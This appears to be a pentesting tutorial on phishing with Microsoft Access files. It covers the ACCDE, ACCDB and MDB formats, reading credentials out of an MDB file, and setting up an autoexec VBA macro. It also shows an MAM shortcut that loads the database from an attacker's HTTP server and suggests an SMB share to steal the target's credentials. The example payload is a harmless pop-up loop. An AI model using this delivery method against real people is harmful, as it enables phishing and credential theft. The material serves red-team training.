Prerequisite:

- Programming in VBA
- General understanding of Microsoft services in Pentesting.
    

Understanding the Access Sevice:

Files with the extension ACCDE (Microsoft Access Execute Only Database) are files used to protect an ACCDB file. It replaces the MDE format which secures an MDB file used by older versions of Access. The permissions do not allow to read the macro code (Execute permissions). This means that the VBA code of an ACCDE file is saved in a way that prevents anyone from seeing or changing it.

![](https://media.discordapp.net/attachments/909429116707680256/919240781158567986/unknown.png)

the major difference between ACCDB and MDB is that ACCDB does not support security or replication at user level while MDB does, on the other hand ACCDB uses a more advanced cryptographic system via windows APIs.

Example of MDB file :

![](https://media.discordapp.net/attachments/909429116707680256/919245188092801054/unknown.png)

As you can see the data is partially encrypted we can get this data: `Driver.SQLServer.SERVER\SQLEXPRESS` `UID: CEOuser` `PWD: CEOpassword`

Example of ACCDB file:


![](https://media.discordapp.net/attachments/909429116707680256/919246921380552704/unknown.png)

it's unreadable but we can still access some data via `strings`.

![](https://media.discordapp.net/attachments/713142876241920000/919261585929809980/unknown.png)

MDB and ACCDB are Microsoft Access databases, but MDB is no longer used in recent versions. Each DB contains different objects like tables, queries, forms, reports, macros and VBA (Visual Basic) code. The files corresponding to Access databases are often linked to a file called LACCDB or LDB for older versions. These files are lock files that allow you to determine which records are locked in a shared database and by whom they are locked.


![](https://media.discordapp.net/attachments/909429116707680256/919249514563518495/unknown.png?width=522&height=343)

the purpose of phishing via Access can allow an attacker to manage a malicious VBA code in ACCDE and autoexec so that at the time of execution the victim is automatically redirected to the attacker's servers.

For the example we are going to make an innoffensive VBA code that will make a loop on the pop up.

```vb
Public Function main()
	func
End Function

Sub func()
	do
	  Msgbox"RISTBS LE AKER PRO",0+16,"An0nym0us"
	loop
End Sub
```

![](https://media.discordapp.net/attachments/713142876241920000/919256210790838352/unknown.png?width=974&height=192)

to put a macro and put the autoexec, go to `Create`->`Macro` and add the action `ExcuterCode` then put the main function of your code for my part it is `main()` and after `Ctrl-S` name it _autoexec_.

Using MAM on a HTTP server but you can use a SMB share which will steal the creds from the target at the same time.

```powershell
[Shortcut Properties]
AccessShortcutVersion=1
DatabaseName=phishing.accdb
ObjectName=autoexec
ObjectType=Macro
Computer=DESKTOP-3IEFJ48
DatabasePath=http://<ip>/phishing.accde
EnableRemote=0
CreationTime= 1d7ee7f7e171f3a
Icon=265
```

![](https://media.discordapp.net/attachments/713142876241920000/919274348836171818/unknown.png?width=974&height=440)

During the execution of the MAM, this is what happens.

![](https://media.discordapp.net/attachments/713142876241920000/919251022973653062/unknown.png?width=974&height=215)
